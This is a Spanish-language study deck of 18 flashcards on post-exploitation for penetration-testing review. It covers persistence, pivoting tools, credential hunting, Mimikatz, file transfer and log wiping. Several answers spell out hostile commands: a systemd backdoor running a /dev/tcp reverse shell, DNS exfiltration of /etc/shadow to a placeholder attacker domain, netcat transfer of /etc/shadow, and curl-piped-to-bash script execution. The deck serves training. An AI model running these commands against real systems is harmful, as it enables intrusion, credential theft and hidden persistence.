---
title: "Flashcards - Post-Explotacion"
tags:
  - hacking
  - ofensivo
  - post-explotacion
  - flashcards
  - repaso
tipo: flashcards
certificacion: hacking-vault
subtema: "post-explotacion"
---

# Flashcards: Post-Explotacion

> 18 tarjetas de repaso. Usa el sistema de repeticion espaciada para memorizar.

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-001">
<div class="flashcard-front">

**P:** Nombra al menos cuatro tecnicas de persistencia en Linux.

</div>
<div class="flashcard-back">

**R:** 1) **Cron job malicioso**: agregar reverse shell al crontab. 2) **Modificar .bashrc**: ejecutar payload al iniciar sesion. 3) **Clave SSH autorizada**: agregar clave publica del atacante a `~/.ssh/authorized_keys`. 4) **Servicio systemd**: crear un servicio que ejecute la reverse shell. 5) **Usuario con privilegios**: crear usuario en grupo sudo. 6) **Binario SUID oculto**: `cp /bin/bash /tmp/.hidden; chmod u+s /tmp/.hidden`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-002">
<div class="flashcard-front">

**P:** Que es SSH port forwarding local y como lo usarias para acceder a un servicio en una red interna a traves de un pivot?

</div>
<div class="flashcard-back">

**R:** `ssh -L 8080:172.16.0.5:80 usuario@10.10.10.1`. Redirige el puerto local 8080 al puerto 80 de 172.16.0.5 a traves del servidor pivot (10.10.10.1). Al acceder a `http://127.0.0.1:8080` se llega al servicio interno 172.16.0.5:80. Es util cuando la maquina interna no es accesible directamente desde el atacante.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-003">
<div class="flashcard-front">

**P:** Que es un Dynamic Port Forwarding con SSH y como se combina con Proxychains?

</div>
<div class="flashcard-back">

**R:** `ssh -D 9050 usuario@10.10.10.1` crea un proxy SOCKS en el puerto local 9050. Configurar proxychains: agregar `socks4 127.0.0.1 9050` al final de `/etc/proxychains4.conf`. Luego se puede enrutar cualquier herramienta: `proxychains nmap -sT -Pn 172.16.0.0/24`. Importante: proxychains solo funciona con TCP, usar `-sT` en nmap (no `-sS`).

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-004">
<div class="flashcard-front">

**P:** Que es Chisel y como se configura para crear un reverse SOCKS proxy?

</div>
<div class="flashcard-back">

**R:** Chisel es un tunel TCP/SOCKS en un binario unico. En el **atacante** (servidor): `./chisel server --reverse --port 8000`. En el **pivot** (cliente): `./chisel client 10.10.14.5:8000 R:socks`. Esto crea un proxy SOCKS en el puerto 1080 del atacante. Luego usar proxychains para enrutar herramientas a traves del tunel.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-005">
<div class="flashcard-front">

**P:** Que es Ligolo-ng y que ventaja tiene sobre Chisel para pivoting?

</div>
<div class="flashcard-back">

**R:** Ligolo-ng crea un tunel de red completo que permite acceso directo a la red interna sin necesidad de proxy SOCKS. En el atacante: `./proxy -selfcert -laddr 0.0.0.0:11601`. En el pivot: `./agent -connect IP:11601 -ignore-cert`. Luego agregar ruta: `sudo ip route add 172.16.0.0/24 dev ligolo`. Se accede directamente con `nmap 172.16.0.5` sin proxychains.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-006">
<div class="flashcard-front">

**P:** En que archivos y ubicaciones buscarias credenciales en un sistema Linux comprometido?

</div>
<div class="flashcard-back">

**R:** `/etc/shadow` (hashes), `~/.bash_history` (passwords en comandos), `/var/www/html/wp-config.php` (WordPress), `/var/www/html/.env` (apps web), `~/.my.cnf` (MySQL), `~/.pgpass` (PostgreSQL), `~/.git-credentials` (Git), `~/.ssh/id_rsa` (claves SSH). Buscar con: `grep -ri "password" /etc/ 2>/dev/null` y `find / -name "id_rsa" 2>/dev/null`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-007">
<div class="flashcard-front">

**P:** Que es Mimikatz y cuales son sus comandos principales para extraer credenciales en Windows?

</div>
<div class="flashcard-back">

**R:** Mimikatz es la herramienta principal para extraer credenciales en Windows. Comandos clave: `privilege::debug` (habilitar privilegios), `sekurlsa::logonpasswords` (credenciales en texto plano), `lsadump::sam` (hashes SAM), `sekurlsa::tickets /export` (tickets Kerberos), `sekurlsa::pth` (pass-the-hash), `lsadump::dcsync /user:dominio\krbtgt` (replicar hashes del DC).

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-008">
<div class="flashcard-front">

**P:** Que es LinPEAS y que secciones de su salida son las mas importantes para escalada de privilegios?

</div>
<div class="flashcard-back">

**R:** LinPEAS es un script de enumeracion automatizada para escalada de privilegios en Linux. Secciones clave: **SUID/SGID binaries**, **Sudo permissions**, **Cron jobs**, **Capabilities**, **Interesting Writable Files** y **Passwords in config files**. Se puede ejecutar sin escribir en disco: `curl http://IP/linpeas.sh | bash`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-009">
<div class="flashcard-front">

**P:** Que es pspy y para que se usa en post-explotacion?

</div>
<div class="flashcard-back">

**R:** pspy es una herramienta que monitorea procesos en ejecucion **sin requerir privilegios de root**. Es especialmente util para detectar cron jobs y procesos ocultos de otros usuarios que no se pueden ver con `crontab -l`. Se ejecuta con `./pspy64` (64 bits) o `./pspy32` (32 bits). Permite descubrir tareas programadas explotables para escalada de privilegios.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-010">
<div class="flashcard-front">

**P:** Que es sshuttle y que ventaja tiene sobre SSH Dynamic Port Forwarding?

</div>
<div class="flashcard-back">

**R:** sshuttle crea una VPN transparente sobre SSH sin necesidad de proxy SOCKS ni proxychains. Se ejecuta con `sshuttle -r usuario@10.10.10.1 172.16.0.0/24`. No requiere root en el pivot (solo SSH y Python). Todo el trafico hacia la subred especificada se enruta automaticamente. Es mas sencillo que configurar proxychains pero requiere Python en el servidor pivot.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-011">
<div class="flashcard-front">

**P:** Como transferirias un archivo desde tu maquina atacante a una victima que solo tiene curl disponible?

</div>
<div class="flashcard-back">

**R:** En el atacante: `python3 -m http.server 80`. En la victima: `curl http://10.10.14.5/linpeas.sh -o linpeas.sh`. Si no se puede escribir en disco: `curl http://10.10.14.5/linpeas.sh | bash`. Alternativamente con wget: `wget http://10.10.14.5/archivo`. Si no hay herramientas de transferencia, usar codificacion Base64: copiar la salida de `base64 -w 0 archivo` y decodificar en el otro extremo.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-012">
<div class="flashcard-front">

**P:** Como usarias netcat para transferir un archivo entre dos maquinas?

</div>
<div class="flashcard-back">

**R:** **Receptor** (atacante): `nc -lvnp 4444 > archivo_recibido`. **Emisor** (victima): `nc 10.10.14.5 4444 < /etc/shadow`. Para enviar en sentido inverso (atacante a victima): en el atacante `nc -lvnp 4444 < archivo_a_enviar`, en la victima `nc 10.10.14.5 4444 > archivo_descargado`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-013">
<div class="flashcard-front">

**P:** Que diferencia hay entre SSH port forwarding local (-L), remoto (-R) y dinamico (-D)?

</div>
<div class="flashcard-back">

**R:** **Local (-L)**: redirige un puerto local hacia un destino remoto a traves del pivot. Uso: acceder a servicios internos. **Remoto (-R)**: expone un puerto local en el servidor remoto. Uso: hacer accesible un servicio local. **Dinamico (-D)**: crea un proxy SOCKS local que enruta todo el trafico TCP a traves del pivot. Uso: acceder a toda una red interna.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-014">
<div class="flashcard-front">

**P:** Como crearias un servicio systemd para mantener persistencia en un sistema Linux comprometido?

</div>
<div class="flashcard-back">

**R:** Crear `/etc/systemd/system/backdoor.service` con: `[Service] Type=simple ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1' Restart=always RestartSec=60 [Install] WantedBy=multi-user.target`. Luego: `systemctl daemon-reload && systemctl enable backdoor.service && systemctl start backdoor.service`. El servicio se reinicia automaticamente cada 60 segundos si falla.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-015">
<div class="flashcard-front">

**P:** Que es la exfiltracion de datos via DNS y por que es efectiva para evadir firewalls?

</div>
<div class="flashcard-back">

**R:** Consiste en codificar datos en consultas DNS dirigidas a un dominio controlado por el atacante. Es efectiva porque el trafico DNS (puerto 53) rara vez esta bloqueado por firewalls. Ejemplo: `cat /etc/shadow | xxd -p | fold -w 60 | while read line; do nslookup $line.exfil.atacante.com; done`. Cada consulta DNS contiene un fragmento de datos codificado como subdominio.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-016">
<div class="flashcard-front">

**P:** Que herramientas de pivoting compararias y cual usarias en cada escenario?

</div>
<div class="flashcard-back">

**R:** **SSH (-L/-R/-D)**: nativo, sin herramientas extra, requiere servidor SSH. **Chisel**: binario unico, facil de transferir, ideal sin SSH. **Sshuttle**: VPN transparente, no requiere root en pivot, necesita Python. **Ligolo-ng**: acceso directo a la red, muy rapido, ideal para redes grandes. **Socat**: port forwarding flexible, util para relays. **Proxychains**: complemento para enrutar herramientas a traves de SOCKS.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-017">
<div class="flashcard-front">

**P:** Que tecnicas de cubrir huellas estudia un pentester y por que NO se aplican en un engagement real?

</div>
<div class="flashcard-back">

**R:** Tecnicas: limpiar `~/.bash_history`, vaciar logs (`/var/log/auth.log`, `/var/log/syslog`), timestomping (`touch -t`), eliminar archivos con `shred -zu`. En un pentesting profesional **NO se cubren huellas** porque se deben documentar todas las acciones con marcas de tiempo para el informe. Se estudian para entender como actuan los atacantes reales y poder detectar estas actividades.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="post-explotacion">
</div>

<div class="flashcard" data-id="post-fc-018">
<div class="flashcard-front">

**P:** Como usarias socat para hacer port forwarding simple de un servicio web?

</div>
<div class="flashcard-back">

**R:** `socat TCP-LISTEN:8080,fork TCP:172.16.0.5:80`. Esto escucha en el puerto 8080 y redirige cada conexion al puerto 80 de 172.16.0.5. El parametro `fork` permite manejar multiples conexiones simultaneas. Para relay de shell reversa: `socat TCP-LISTEN:4444,fork TCP:10.10.14.5:4444` redirige la conexion de la victima al atacante.

</div>
</div>

---
